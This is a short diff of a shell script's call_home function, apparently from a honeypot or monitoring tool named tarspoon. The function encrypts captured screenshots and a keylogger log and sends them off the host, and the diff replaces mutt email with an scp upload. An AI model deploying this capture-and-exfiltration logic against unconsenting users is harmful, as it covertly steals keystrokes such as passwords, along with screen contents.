@@ -40,13 +40,13 @@ function call_home {
 	if [[ -f ${PHOTO_PACKAGE_ROOT}/../maul.tgz ]]; then
 		echo "$(date)> call: found juicy screenshots" >> /var/log/tarspoon/tarspoon.log
 		gpg -eo /root/maul.gpg -r "$NAME" ${PHOTO_PACKAGE_ROOT}/../maul.tgz
-		echo "sent from h0n3yp07 v0.1.0" |mutt -a /root/maul.gpg -s "${STATUS} M4UL $(date)" -b "$MAIL"
+    tarspoon-scp /root/maul.gpg
 	fi
 
 	if [[ -f /var/log/logkeys.log ]]; then
 		echo "$(date)> call: found some keypresses" >> /var/log/tarspoon/tarspoon.log
 		gpg -eo /root/keys.gpg -r "$NAME" /var/log/logkeys.log
-		echo "sent from h0n3yp07 v0.1.0" |mutt -a /root/keys.gpg -s "${STATUS} K3YZ $(date)" -b "$MAIL"
+    tarspoon-scp /root/keys.gpg
 	fi
 }
 
